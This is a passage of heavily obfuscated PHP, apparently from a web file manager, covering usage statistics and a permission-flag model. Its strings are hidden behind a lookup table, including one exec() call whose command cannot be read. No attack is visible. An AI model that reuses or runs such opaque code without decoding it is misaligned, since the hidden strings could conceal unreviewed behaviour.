$»¾ªš½[839], $»¾ªš½[1921], $»¾ªš½[1922])), $»¾ªš½[1923] => array($»¾ªš½[33] => $»¾ªš½[1924], $»¾ªš½[353] => array($»¾ªš½[285], $»¾ªš½[837], $»¾ªš½[1925], $»¾ªš½[1926], $»¾ªš½[1927]))); if (!isset($©—õ€êª[$÷ªÊ¥ùÀ])) { return !1; } $this->optionType = $©—õ€êª[$÷ªÊ¥ùÀ][$»¾ªš½[33]]; $this->field = $©—õ€êª[$÷ªÊ¥ùÀ][$»¾ªš½[353]]; return !0; } public function listData($ØÏ³æš = false, $şæ­•â = "\x6d\157\x64\x69\x66\171\124\x69\155\x65", $ôÒ¼ö¦ = false) { return parent::listData($ØÏ³æš, $şæ­•â, $ôÒ¼ö¦); } public function trendList($ª¯ÑÂñÍ) { $şÎåƒ¶ =& $_SERVER[¼¥ÊĞÙÌ]; $àˆÚù°Ş = $this->listData(); if ($àˆÚù°Ş) { $•ñâÜŞ© = end($àˆÚù°Ş); $àôéŞ‚ñ = date($şÎåƒ¶[1928], strtotime($şÎåƒ¶[1929])); if ($•ñâÜŞ©[$şÎåƒ¶[285]] == $àôéŞ‚ñ) { return $àˆÚù°Ş; } $³¬ÂâÙÈ = strtotime($•ñâÜŞ©[$şÎåƒ¶[285]]); } if (!isset($³¬ÂâÙÈ)) { $€„ôºûÔ = $ª¯ÑÂñÍ == $şÎåƒ¶[670] ? $şÎåƒ¶[602] : $şÎåƒ¶[904]; $³¬ÂâÙÈ = Model($€„ôºûÔ)->min($şÎåƒ¶[234]); } $ù¹Õ×„ = $şÎåƒ¶[1930] . ucfirst($ª¯ÑÂñÍ); $ì‰æÓÕœ = $this->dateList($³¬ÂâÙÈ); foreach ($ì‰æÓÕœ as $àôéŞ‚ñ) { $this->{$ù¹Õ×„}($àôéŞ‚ñ); } return $this->listData(); } private function dateList($û¶Û£ø) { $ÍÖÎºÌ =& $_SERVER[¼¥ÊĞÙÌ]; $ë§İŞ­’ = $û¶Û£ø; $™—†–ÂÓ = strtotime($ÍÖÎºÌ[1929]); $êÛ±Ş… = array(); while ($ë§İŞ­’ <= $™—†–ÂÓ) { $êÛ±Ş…[] = date($ÍÖÎºÌ[1928], $ë§İŞ­’); $ë§İŞ­’ = strtotime($ÍÖÎºÌ[1931], $ë§İŞ­’); } return $êÛ±Ş…; } public function _recordUser($‹äÕ¼ı = '') { $÷±êŞ‡ä =& $_SERVER[¼¥ÊĞÙÌ]; $áÆÚ­İö = strtotime(date($÷±êŞ‡ä[1932], strtotime($‹äÕ¼ı))); $ØŸãÅ“Á = strtotime(date($÷±êŞ‡ä[1933], strtotime($‹äÕ¼ı))); $ÅŒ«Í¬… = array($÷±êŞ‡ä[234] => array($÷±êŞ‡ä[1099], $ØŸãÅ“Á)); $„¨éŒÌâ = Model($÷±êŞ‡ä[602])->where($ÅŒ«Í¬…)->count($÷±êŞ‡ä[1790]); $ÅŒ«Í¬…[$÷±êŞ‡ä[234]] = array($÷±êŞ‡ä[411], array($áÆÚ­İö, $ØŸãÅ“Á)); $ßú˜†‰© = Model($÷±êŞ‡ä[602])->where($ÅŒ«Í¬…)->count($÷±êŞ‡ä[1790]); $ÅŒ«Í¬…[$÷±êŞ‡ä[33]] = $÷±êŞ‡ä[1934]; $™ÄÁ¸¶° = Model($÷±êŞ‡ä[1935])->where($ÅŒ«Í¬…)->count($÷±êŞ‡ä[1936]); $›ä®´üì = array($÷±êŞ‡ä[285] => $‹äÕ¼ı, $÷±êŞ‡ä[839] => (int) $„¨éŒÌâ, $÷±êŞ‡ä[1921] => (int) $ßú˜†‰©, $÷±êŞ‡ä[1922] => (int) $™ÄÁ¸¶°); return $this->insert($›ä®´üì); } public function _recordStore($Ã¤‘ı²æ = '') { $‡îÍéãö =& $_SERVER[¼¥ÊĞÙÌ]; $½Ù‰Î®Ê = strtotime(date($‡îÍéãö[1933], strtotime($Ã¤‘ı²æ))); $—ãƒß¥Ó = array($‡îÍéãö[234] => array($‡îÍéãö[1099], $½Ù‰Î®Ê)); $¦ïëÉ¶Š = Model($‡îÍéãö[549])->where($—ãƒß¥Ó)->sum($‡îÍéãö[79]); $—ãƒß¥Ó[$‡îÍéãö[488]] = 0; $Ü±¢ = Model($‡îÍéãö[904])->where($—ãƒß¥Ó)->sum($‡îÍéãö[79]); $—ãƒß¥Ó[$‡îÍéãö[191]] = 1; $èĞ¶øş = Model($‡îÍéãö[904])->where($—ãƒß¥Ó)->sum($‡îÍéãö[79]); $—ãƒß¥Ó[$‡îÍéãö[191]] = 2; $ÁÂŞ…ô = Model($‡îÍéãö[904])->where($—ãƒß¥Ó)->sum($‡îÍéãö[79]); $î“ŞÅ¼ = array($‡îÍéãö[285] => $Ã¤‘ı²æ, $‡îÍéãö[837] => (int) $Ü±¢, $‡îÍéãö[1925] => (int) $¦ïëÉ¶Š, $‡îÍéãö[1926] => (int) $èĞ¶øş, $‡îÍéãö[1927] => (int) $ÁÂŞ…ô); return $this->insert($î“ŞÅ¼); } public function trend($ºìå—Ñê, $ ¦Û½Ş˜) { $ØË…ï¼ =& $_SERVER[¼¥ÊĞÙÌ]; if (!$this->init($ºìå—Ñê)) { return !1; } $ÚÜ±×ÄË = $this->trendList($ºìå—Ñê); if ($ÚÜ±×ÄË && $ ¦Û½Ş˜ != $ØË…ï¼[1762]) { $ò İÌÇï = $ÚÜ±×ÄË[0][$ØË…ï¼[285]]; $Ã¥ä°™ = $this->validDate($ ¦Û½Ş˜, $ò İÌÇï); $¥éÀÚ¨ = array(); $ËÇÅ«™Í = array_to_keyvalue($ÚÜ±×ÄË, $ØË…ï¼[285]); foreach ($Ã¥ä°™ as $¿çÀ©û) { if (isset($ËÇÅ«™Í[$¿çÀ©û])) { $ÎÁµÕÔÓ = $ËÇÅ«™Í[$¿çÀ©û]; } else { $ÎÁµÕÔÓ = end($ÚÜ±×ÄË); $ÎÁµÕÔÓ[$ØË…ï¼[285]] = $¿çÀ©û; if ($ºìå—Ñê == $ØË…ï¼[670]) { $ÎÁµÕÔÓ[$ØË…ï¼[1921]] = $ÎÁµÕÔÓ[$ØË…ï¼[1922]] = 0; } } $¥éÀÚ¨[] = $ÎÁµÕÔÓ; } $ÚÜ±×ÄË = $¥éÀÚ¨; } $œÑøÆË = array($ØË…ï¼[670] => array($ØË…ï¼[839] => LNG($ØË…ï¼[1937]), $ØË…ï¼[1921] => LNG($ØË…ï¼[1938]), $ØË…ï¼[1922] => LNG($ØË…ï¼[1939])), $ØË…ï¼[1923] => array($ØË…ï¼[837] => LNG($ØË…ï¼[1940]), $ØË…ï¼[1925] => LNG($ØË…ï¼[1941]), $ØË…ï¼[1926] => LNG($ØË…ï¼[1942]), $ØË…ï¼[1927] => LNG($ØË…ï¼[1943]))); $·ÓÙÄŠ” = array($ØË…ï¼[670] => $ØË…ï¼[1944], $ØË…ï¼[1923] => $ØË…ï¼[79]); if (empty($ÚÜ±×ÄË)) { $¿çÀ©û = date($ØË…ï¼[1928], strtotime($ØË…ï¼[1929])); $€ÑÂäØˆ = array($ØË…ï¼[285] => $¿çÀ©û); foreach ($œÑøÆË[$ºìå—Ñê] as $»ãÒÍö¥ => $Ã¿û¨Ü) { $€ÑÂäØˆ[$»ãÒÍö¥] = 0; } $ÚÜ±×ÄË[] = $€ÑÂäØˆ; } $„í«ëÔ¡ = array(); foreach ($ÚÜ±×ÄË as $Ã¿û¨Ü) { if ($ºìå—Ñê == $ØË…ï¼[1923] && $Ã¿û¨Ü[$ØË…ï¼[1925]] > $Ã¿û¨Ü[$ØË…ï¼[837]]) { $Ã¿û¨Ü[$ØË…ï¼[1925]] = $Ã¿û¨Ü[$ØË…ï¼[837]]; } foreach ($œÑøÆË[$ºìå—Ñê] as $»ãÒÍö¥ => $¢ˆäáâ§) { $ÎÁµÕÔÓ = array($ØË…ï¼[285] => $Ã¿û¨Ü[$ØË…ï¼[285]], $ØË…ï¼[1678] => $¢ˆäáâ§); $ÎÁµÕÔÓ[$·ÓÙÄŠ”[$ºìå—Ñê]] = isset($Ã¿û¨Ü[$»ãÒÍö¥]) ? $Ã¿û¨Ü[$»ãÒÍö¥] : 0; $„í«ëÔ¡[] = $ÎÁµÕÔÓ; } } return $„í«ëÔ¡; } public function validDate($¶æîæ¶ñ, $¶ Í¶ö) { $è‹˜û»™ =& $_SERVER[¼¥ÊĞÙÌ]; $‚‹îî˜¬ = date($è‹˜û»™[1928], strtotime($è‹˜û»™[1929])); $‰üå©³Ø = array($‚‹îî˜¬); switch ($¶æîæ¶ñ) { case $è‹˜û»™[1769]: $ë‘®®€ï = mktime(0, 0, 0, date($è‹˜û»™[1945]), date($è‹˜û»™[1471]) - date($è‹˜û»™[1560]) + 7 - 7, date($è‹˜û»™[1946])); $şôş‚ = 0; do { $÷õä…ú´ = date($è‹˜û»™[1928], $ë‘®®€ï - 3600 * 24 * 7 * $şôş‚); $‰üå©³Ø[] = $÷õä…ú´; $şôş‚++; } while ($¶ Í¶ö < $÷õä…ú´); break; case $è‹˜û»™[1767]: $şôş‚ = 1; do { $Â¡Š‹ÇÙ = date($è‹˜û»™[1947], strtotime("\55\x20{$şôş‚}\40\155\x6f\156\164\x68\163")); $‰üå©³Ø[] = $Â¡Š‹ÇÙ; $şôş‚++; } while ($¶ Í¶ö < $Â¡Š‹ÇÙ); break; case $è‹˜û»™[1948]: $Éã“¯ = (int) date($è‹˜û»™[1946], strtotime($¶ Í¶ö)); $îÊü÷Œ = (int) date($è‹˜û»™[1946]); if ($Éã“¯ >= $îÊü÷Œ) { break; } for ($Éã“¯; $Éã“¯ < $îÊü÷Œ; $Éã“¯++) { $‰üå©³Ø[] = $Éã“¯ . $è‹˜û»™[1949]; } break; default: break; } if ($¶ Í¶ö > end($‰üå©³Ø)) { array_pop($‰üå©³Ø); } sort($‰üå©³Ø); return $‰üå©³Ø; } public function listTable($©•¼½×Á) { $û÷ÍÍñğ = ucfirst($©•¼½×Á); return Model($û÷ÍÍñğ)->listData(); } public function option($ğâ¸àœÀ) { $•½äê¼µ = $_SERVER[¼¥ÊĞÙÌ][1950] . ucfirst($ğâ¸àœÀ); return $this->{$•½äê¼µ}(); } private function optionUser() { $ø¿êœï =& $_SERVER[¼¥ÊĞÙÌ]; $ÔÅ®±¦Ù = Model($ø¿êœï[602])->count($ø¿êœï[1790]); $¨Üİ´‡ = Model($ø¿êœï[602])->where($ø¿êœï[1951])->count($ø¿êœï[1790]); $ÜèÅ³„ = intval($GLOBALS[$ø¿êœï[6]][$ø¿êœï[427]][$ø¿êœï[1735]]) / 3600; $ùºí¿ = strtotime("\55{$ÜèÅ³„}\x20\x68\x6f\x75\162\163"); $¨Â…Â = strtotime(date($ø¿êœï[1932])); if ($ùºí¿ < $¨Â…Â) { $ùºí¿ = $¨Â…Â; } $Õ¯Š·•ü = array($ø¿êœï[1952] => array($ø¿êœï[1100], $ùºí¿)); $ñ¥ï©Áß = (int) Model($ø¿êœï[602])->where($Õ¯Š·•ü)->count($ø¿êœï[1790]); if (!$ñ¥ï©Áß) { $ñ¥ï©Áß = 1; } $Õ¯Š·•ü = array($ø¿êœï[1952] => array($ø¿êœï[1100], $¨Â…Â)); $›©ÇÏ£œ = Model($ø¿êœï[602])->where($Õ¯Š·•ü)->count($ø¿êœï[1790]); return array($ø¿êœï[832] => (int) $ÔÅ®±¦Ù, $ø¿êœï[1953] => (int) ($ÔÅ®±¦Ù - $¨Üİ´‡), $ø¿êœï[1954] => (int) $¨Üİ´‡, $ø¿êœï[1955] => (int) $›©ÇÏ£œ, $ø¿êœï[1956] => $ñ¥ï©Áß); } private function optionFile() { $”‚±çƒé =& $_SERVER[¼¥ÊĞÙÌ]; $©íÛÚŞ˜ = $this->sourceSize(); $ğÕûÌ³ = $©íÛÚŞ˜[$”‚±çƒé[79]]; $ùÛØ…şÔ = $©íÛÚŞ˜[$”‚±çƒé[1925]]; $®Ëò‡ = Model($”‚±çƒé[904])->where(array($”‚±çƒé[488] => 0))->count($”‚±çƒé[194]); $¢ÚñëÍ = array($”‚±çƒé[488] => 0, $”‚±çƒé[234] => array($”‚±çƒé[1100], strtotime(date($”‚±çƒé[1932])))); $œİàóïå = Model($”‚±çƒé[904])->where($¢ÚñëÍ)->sum($”‚±çƒé[79]); $Àİ¨»½  = Model($”‚±çƒé[904])->where($¢ÚñëÍ)->count($”‚±çƒé[194]); return array($”‚±çƒé[837] => $ğÕûÌ³, $”‚±çƒé[1925] => $ùÛØ…şÔ, $”‚±çƒé[1957] => $ğÕûÌ³ - $ùÛØ…şÔ, $”‚±çƒé[1958] => (int) $œİàóïå, $”‚±çƒé[839] => (int) $®Ëò‡, $”‚±çƒé[1959] => (int) $Àİ¨»½ ); } private function optionAccess() { $ÃÑÌó =& $_SERVER[¼¥ÊĞÙÌ]; return array($ÃÑÌó[832] => $this->typeLogCnt(), $ÃÑÌó[110] => $this->typeLogCnt($ÃÑÌó[110]), $ÃÑÌó[528] => $this->typeLogCnt($ÃÑÌó[528]), $ÃÑÌó[1960] => $this->typeLogCnt($ÃÑÌó[1960]), $ÃÑÌó[1961] => $this->typeLogCnt($ÃÑÌó[1961]), $ÃÑÌó[670] => $this->typeLogCnt($ÃÑÌó[12], $ÃÑÌó[1936])); } private function typeLogCnt($åşåƒõ  = '', $Ÿ©·› = "\x69\144") { $ÕƒÖÂÁó =& $_SERVER[¼¥ÊĞÙÌ]; $³İ¦•Ğ¹ = array($ÕƒÖÂÁó[110] => array($ÕƒÖÂÁó[1962], $ÕƒÖÂÁó[1963]), $ÕƒÖÂÁó[528] => array($ÕƒÖÂÁó[1964], $ÕƒÖÂÁó[1965]), $ÕƒÖÂÁó[1960] => array($ÕƒÖÂÁó[1966], $ÕƒÖÂÁó[1967], $ÕƒÖÂÁó[1968]), $ÕƒÖÂÁó[1961] => array($ÕƒÖÂÁó[1969], $ÕƒÖÂÁó[1970]), $ÕƒÖÂÁó[1971] => array($ÕƒÖÂÁó[1972], $ÕƒÖÂÁó[1973], $ÕƒÖÂÁó[1974])); $øÃÊÛÑè = strtotime(date($ÕƒÖÂÁó[1932])); $†¦ÏëŸ = array($ÕƒÖÂÁó[234] => array($ÕƒÖÂÁó[1100], $øÃÊÛÑè)); if ($åşåƒõ ) { $†¦ÏëŸ[$ÕƒÖÂÁó[33]] = array($ÕƒÖÂÁó[7], $³İ¦•Ğ¹[$åşåƒõ ]); } $«àÎšÛñ = Model($ÕƒÖÂÁó[1935])->where($†¦ÏëŸ)->count($Ÿ©·›); return (int) $«àÎšÛñ; } private function optionServer() { $¶½ÙÜ±• =& $_SERVER[¼¥ÊĞÙÌ]; $Ü€Û„ùŸ = $this->diskDriver(); $¶ÉßÑËğ = KodIO::defaultDriver(); $°ëÕç•¼ = array($¶½ÙÜ±•[897] => $¶ÉßÑËğ[$¶½ÙÜ±•[478]]); $éÈÛ»Ê‘ = Model($¶½ÙÜ±•[549])->where($°ëÕç•¼)->sum($¶½ÙÜ±•[79]); $œæóğÊŸ = explode($¶½ÙÜ±•[53], $_SERVER[$¶½ÙÜ±•[147]]); $‰¨‡À‡ = $œæóğÊŸ[0]; $ÜŒ†á“ = $GLOBALS[$¶½ÙÜ±•[6]][$¶½ÙÜ±•[21]]; $ˆ¥ŸÂ¬Ç = $ÜŒ†á“[$¶½ÙÜ±•[1062]]; if ($ˆ¥ŸÂ¬Ç == $¶½ÙÜ±•[1050]) { $ñİİªä§ = explode($¶½ÙÜ±•[1380], $ÜŒ†á“[$¶½ÙÜ±•[1061]]); $ˆ¥ŸÂ¬Ç = $ñİİªä§[0]; } if ($ˆ¥ŸÂ¬Ç == $¶½ÙÜ±•[998] || $ˆ¥ŸÂ¬Ç == $¶½ÙÜ±•[882]) { $˜ĞØı¦á = Model()->db()->query($¶½ÙÜ±•[1975]); $ï¼ßÄ˜ß = $˜ĞØı¦á[0] && isset($˜ĞØı¦á[0][$¶½ÙÜ±•[1677]]) ? $˜ĞØı¦á[0][$¶½ÙÜ±•[1677]] : 0; $ˆ¥ŸÂ¬Ç = $¶½ÙÜ±•[1976] . ($ï¼ßÄ˜ß ? $¶½ÙÜ±•[8] . $ï¼ßÄ˜ß : $¶½ÙÜ±•[12]); } $û÷íâµ¾ = $GLOBALS[$¶½ÙÜ±•[6]][$¶½ÙÜ±•[427]][$¶½ÙÜ±•[906]]; return array($¶½ÙÜ±•[1977] => $Ü€Û„ùŸ ? $Ü€Û„ùŸ[$¶½ÙÜ±•[1978]] : 0, $¶½ÙÜ±•[1979] => $Ü€Û„ùŸ ? $Ü€Û„ùŸ[$¶½ÙÜ±•[1980]] : 0, $¶½ÙÜ±•[1981] => (int) $¶ÉßÑËğ[$¶½ÙÜ±•[1978]] * 1024 * 1024 * 1024, $¶½ÙÜ±•[1982] => (int) $éÈÛ»Ê‘, $¶½ÙÜ±•[1983] => ucfirst($‰¨‡À‡), $¶½ÙÜ±•[1984] => $¶½ÙÜ±•[1985] . PHP_VERSION, $¶½ÙÜ±•[1986] => phpBuild64() ? 64 : 32, $¶½ÙÜ±•[831] => str_replace($¶½ÙÜ±•[1219], $¶½ÙÜ±•[1078], $ˆ¥ŸÂ¬Ç), $¶½ÙÜ±•[427] => ucfirst($û÷íâµ¾), $¶½ÙÜ±•[32] => $_SERVER[$¶½ÙÜ±•[1987]]); } private function diskDriver() { $‡ï…‘±µ =& $_SERVER[¼¥ÊĞÙÌ]; $ÁªÛ˜ùÈ = $‡ï…‘±µ[8]; $£íØÎ¢ = $GLOBALS[$‡ï…‘±µ[6]][$‡ï…‘±µ[1404]] == $‡ï…‘±µ[1405]; if ($£íØÎ¢) { $ÁªÛ˜ùÈ = $‡ï…‘±µ[1988]; if (function_exists($‡ï…‘±µ[1989])) { exec($‡ï…‘±µ[1990], $æ İı—ï); $ÁªÛ˜ùÈ = $æ İı—ï[1] . $‡ï…‘±µ[8]; } } if (!file_exists($ÁªÛ˜ùÈ)) { return; } if (!function_exists($‡ï…‘±µ[1991])) { return; } $É°ƒÑ¾Á = @disk_total_space($ÁªÛ˜ùÈ); $ŞéÜÕ® = $É°ƒÑ¾Á - @disk_free_space($ÁªÛ˜ùÈ); return array($‡ï…‘±µ[1978] => $É°ƒÑ¾Á, $‡ï…‘±µ[1980] => $ŞéÜÕ®); } public function fileChart($ö’‹ÜÖÚ) { $Ú÷ëò©É =& $_SERVER[¼¥ÊĞÙÌ]; if (isset($ö’‹ÜÖÚ[$Ú÷ëò©É[1790]])) { return Model($Ú÷ëò©É[904])->userFileTypeProfile($ö’‹ÜÖÚ[$Ú÷ëò©É[1790]]); } if (isset($ö’‹ÜÖÚ[$Ú÷ëò©É[1402]])) { return Model($Ú÷ëò©É[904])->groupFileTypeProfile($ö’‹ÜÖÚ[$Ú÷ëò©É[1402]]); } $íéûÙëâ = $this->sourceSize(); $¿éÃÁìû = array($Ú÷ëò©É[193] => 0, $Ú÷ëò©É[191] => 1); $—Ùû ŸÀ = Model($Ú÷ëò©É[904])->where($¿éÃÁìû)->sum($Ú÷ëò©É[79]); $¿éÃÁìû[$Ú÷ëò©É[191]] = 2; $ã©™ÅÖ˜ = Model($Ú÷ëò©É[904])->where($¿éÃÁìû)->sum($Ú÷ëò©É[79]); return array($Ú÷ëò©É[837] => $íéûÙëâ[$Ú÷ëò©É[79]], $Ú÷ëò©É[1925] => $íéûÙëâ[$Ú÷ëò©É[1925]], $Ú÷ëò©É[1926] => (int) $—Ùû ŸÀ, $Ú÷ëò©É[1927] => (int) $ã©™ÅÖ˜); } private function sourceSize() { $§İ¦ûí =& $_SERVER[¼¥ÊĞÙÌ]; $¨¢é­¹æ = Model($§İ¦ûí[904])->where(array($§İ¦ûí[488] => 0))->sum($§İ¦ûí[79]); $œºûĞ = Model($§İ¦ûí[549])->sum($§İ¦ûí[79]); if ($œºûĞ > $¨¢é­¹æ) { $œºûĞ = $¨¢é­¹æ; } return array($§İ¦ûí[79] => (int) $¨¢é­¹æ, $§İ¦ûí[1925] => (int) $œºûĞ); } } class AuthModel extends ModelBaseLight { const AUTH_SHOW = 1; const AUTH_VIEW = 2; const AUTH_DOWNLOAD = 4; const AUTH_UPLOAD = 8; const AUTH_EDIT = 16; const AUTH_REMOVE = 32; const AUTH_SHARE = 64; const AUTH_COMMENT = 128; const AUTH_EVENT = 256; const AUTH_ROOT = 33554432; public static function authAll() { return self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT | self::AUTH_ROOT; } public static function authDefault() { $¢òøí¤¶ =& $_SERVER[¼¥ÊĞÙÌ]; $Û‹¸–ëğ = array(array($¢òøí¤¶[497] => LNG($¢òøí¤¶[1992]), $¢òøí¤¶[1993] => $¢òøí¤¶[1994], $¢òøí¤¶[1995] => 1, $¢òøí¤¶[1996] => 1, $¢òøí¤¶[1997] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT), array($¢òøí¤¶[497] => LNG($¢òøí¤¶[1998]), $¢òøí¤¶[1993] => $¢òøí¤¶[1999], $¢òøí¤¶[1995] => 2, $¢òøí¤¶[1996] => 1, $¢òøí¤¶[1997] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_COMMENT | self::AUTH_EVENT), array($¢òøí¤¶[497] => LNG($¢òøí¤¶[2000]), $¢òøí¤¶[1993] => $¢òøí¤¶[2001], $¢òøí¤¶[1995] => 3, $¢òøí¤¶[1996] => 1, $¢òøí¤¶[1997] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_COMMENT | self::AUTH_EVENT), array($¢òøí¤¶[497] => LNG($¢òøí¤¶[2002]), $¢òøí¤¶[1993] => $¢òøí¤¶[2003], $¢òøí¤¶[1995] => 4, $¢òøí¤¶[1996] => 1, $¢òøí¤¶[1997] => self::AUTH_SHOW | self::AUTH_VIEW), array($¢òøí¤¶[497] => LNG($¢òøí¤¶[2004]), $¢òøí¤¶[1993] => $¢òøí¤¶[2005], $¢òøí¤¶[1995] => 5, $¢òøí¤¶[1996] => 1, $¢òøí¤¶[1997] => self::AUTH_SHOW | self::AUTH_UPLOAD), array($¢òøí¤¶[497] => LNG($¢òøí¤¶[2006]), $¢òøí¤¶[1993] => $¢òøí¤¶[2007], $¢òøí¤¶[1995] => 6, $¢òøí¤¶[1996] => 1, $¢òøí¤¶[1997] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT | self::AUTH_ROOT), array($¢òøí¤¶[497] => LNG($¢òøí¤¶[2008]), $¢òøí¤¶[1993] => $¢òøí¤¶[2009], $¢òøí¤¶[1995] => 7, $¢òøí¤¶[1996] => 1, $¢òøí¤¶[1997] => 0)); return $Û‹¸–ëğ; } public static function authCheck($ÂşšÓ¦Ğ, $„’¸’’·) { $£¹×È®º =& $_SERVER[¼¥ÊĞÙÌ]; $ÂşšÓ¦Ğ = intval($ÂşšÓ¦Ğ); if (KodUser::isRoot() && $GLOBALS[$£¹×È®º[6]][$£¹×È®º[2010]]) { return !0; } if ($ÂşšÓ¦Ğ <= 0) { return !1; } if (($ÂşšÓ¦Ğ & self::AUTH_ROOT) == self::AUTH_ROOT) { return !0; } return !!($ÂşšÓ¦Ğ & $„’¸’’·); } public static function authCheckShow($Î‰íû¯Î) { return self::authCheck($Î‰íû¯Î, self::AUTH_SHOW); } public static function authCheckView($‚ƒŞ¢¨) { return self::authCheck($‚ƒŞ¢¨, self::AUTH_VIEW); } public static function authCheckDownload($§ÅŠê‡) { return self::authCheck($§ÅŠê‡, self::AUTH_DOWNLOAD); } public static function authCheckUpload($ï®äÏê) { return self::authCheck($ï®äÏê, self::AUTH_UPLOAD); } public static function authCheckEdit($ÔÑ³˜áğ) { return self::authCheck($ÔÑ³˜áğ, self::AUTH_EDIT); } public static function authCheckRemove($×âéãµ³) { return self::authCheck($×âéãµ³, self::AUTH_REMOVE); } public static function authCheckShare($®òªöÂĞ) { return self::authCheck($®òªöÂĞ, self::AUTH_SHARE); } public static function authCheckComment($‹àÓÏ´ú) { return self::authCheck($‹àÓÏ´ú, self::AUTH_COMMENT); } public static function authCheckEvent($œÆÁÊä) { return self::authCheck($œÆÁÊä, self::AUTH_EVENT); } public static function authCheckRoot($ÏÕÖæãü) { return self::authCheck($ÏÕÖæãü, self::AUTH_ROOT); } public static function authCheckAction($•¯³‡˜–, $š¸İğÇµ) { $‚ÑæäÀ½ =& $_SERVER[¼¥ÊĞÙÌ]; $Ç“ì´Ê— = array($‚ÑæäÀ½[2011] => self::AUTH_VIEW, $‚ÑæäÀ½[1291] => self::AUTH_DOWNLOAD, $‚ÑæäÀ½[110] => self::AUTH_UPLOAD, $‚ÑæäÀ½[1961] => self::AUTH_EDIT, $‚ÑæäÀ½[1960] => self::AUTH_REMOVE, $‚ÑæäÀ½[1971] => self::AUTH_SHARE, $‚ÑæäÀ½[432] => self::AUTH_COMMENT, $‚ÑæäÀ½[1777] => self::AUTH_EVENT, $‚ÑæäÀ½[2012] => self::AUTH_ROOT); if (!isset($Ç“ì´Ê—[$š¸İğÇµ])) { return; } $äıÙŒ©ş = $Ç“ì´Ê—[$š¸İğÇµ]; $•¯³‡˜– = intval($•¯³‡˜–); if ($•¯³‡˜– <= 0) { return !1; } if (($•¯³‡˜– & self::AUTH_ROOT) == self::AUTH_ROOT) { return !0; } return !!($•¯³‡˜– & $äıÙŒ©ş); } public static function authDisable($äŸ’ÍÓ‡, $Á‚¯ƒÂ‚) { if (intval($äŸ’ÍÓ‡) <= 0) { return 0; } return intval($äŸ’ÍÓ‡) & ~$Á‚¯ƒÂ‚; } public $optionType = "\123\x79\163\164\145\x6d\x2e\x73\x6f\x75\x72\143\145\101\x75\x74\150\x4c\151\163\164"; public $field = array("\156\141\155\145", "\141\165\x74\150", "\x6c\141\142\x65\154", "\x64\x69\163\x70\154\x61\171", "\163\171\163\164\x65\155", "\163\157\162\x74"); public function initData() { $©ú¥è£Ê = $this->authDefault(); foreach ($©ú¥è£Ê as $†ËãÓÆà) { $this->add($†ËãÓÆà); } } public function findAuth($Îó†¼Ğ, $¿ø®øáå) { $Ÿîıº× =& $_SERVER[¼¥ÊĞÙÌ]; $×²šù‹ = parent::listData(); foreach ($×²šù‹ as $Æ‹‡Ò) { $¸ˆ¥ğ€„ = intval($Æ‹‡Ò[$Ÿîıº×[490]]); if ($¸ˆ¥ğ€„ <= 0 || $Æ‹‡Ò[$Ÿîıº×[2013]] == 0) { continue; } if (($¸ˆ¥ğ€„ & $Îó†¼Ğ) != $Îó†¼Ğ) { continue; } if (($¸ˆ¥ğ€„ & $¿ø®øáå) != 0) { continue; } return $Æ‹‡Ò[$Ÿîıº×[478]]; } return !1; } public function findAuthMax($¸ÄôıÏ–, $ˆê¤øÉ) { $½«‘£ô– =& $_SERVER[¼¥ÊĞÙÌ]; $õ®Ã¥¶ˆ = !1; $ıòË¬ï = parent::listData(); foreach ($ıòË¬ï as $€¸½ŸÜ) { $«‹ğ®— = intval($€¸½ŸÜ[$½«‘£ô–[490]]); if ($«‹ğ®— <= 0 || $€¸½ŸÜ[$½«‘£ô–[2013]] == 0) { continue; } if (($«‹ğ®— & $¸ÄôıÏ–) != $¸ÄôıÏ–) { continue; } if (($«‹ğ®— & $ˆê¤øÉ) != 0) { continue; } if (!$õ®Ã¥¶ˆ) { $õ®Ã¥¶ˆ = $€¸½ŸÜ; continue; } if (intval($õ®Ã¥¶ˆ[$½«‘£ô–[490]]) < $«‹ğ®—) { $õ®Ã¥¶ˆ = $€¸½ŸÜ; } } return $õ®Ã¥¶ˆ ? $õ®Ã¥¶ˆ[$½«‘£ô–[478]] : !1; } public function findAuthReadOnly() { $íø¾èÍ = self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD; $£ûêì« = self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE; return $this->findAuth($íø¾èÍ, $£ûêì«); } public function findAuthNotRead() { return $this->findAuth(0, self::AUTH_SHOW); } public function findAuthMinDefault() { $áØšÄ‘® =& $_SERVER[¼¥ÊĞÙÌ]; $°§ëƒÈë = parent::listData(); $ø‰ûú®ı = !1; foreach ($°§ëƒÈë as $èû˜ÖÍğ) { if ($èû˜ÖÍğ[$áØšÄ‘®[490]] <= 0 || $èû˜ÖÍğ[$áØšÄ‘®[2013]] == $áØšÄ‘®[231]) { continue; } if (!$ø‰ûú®ı) { $ø‰ûú®ı = $èû˜ÖÍğ; continue; } if ($ø‰ûú®ı[$áØšÄ‘®[490]] > $èû˜ÖÍğ[$áØšÄ‘®[490]]) { $ø‰ûú®ı = $èû˜ÖÍğ; } } return $ø‰ûú®ı ? $ø‰ûú®ı[$áØšÄ‘®[478]] : $áØšÄ‘®[12]; } public function listData($‰¬¾ìŠÅ = false, $­ªâ ­ = "\163\157\x72\x74", $¤æ€ş¾ = false) { return parent::listData($‰¬¾ìŠÅ, $­ªâ ­, $¤æ€ş¾); } public function update($º¥­±ËÉ, $¢‰®²„Á) { $³‰òç• =& $_SERVER[¼¥ÊĞÙÌ]; $©‰¦„Òè = parent::listData($º¥­±ËÉ); $¶óßˆƒ¶ = $this->findByName($¢‰®²„Á[$³‰òç•[32]]); if (!$©‰¦„Òè || $¶óßˆƒ¶ && 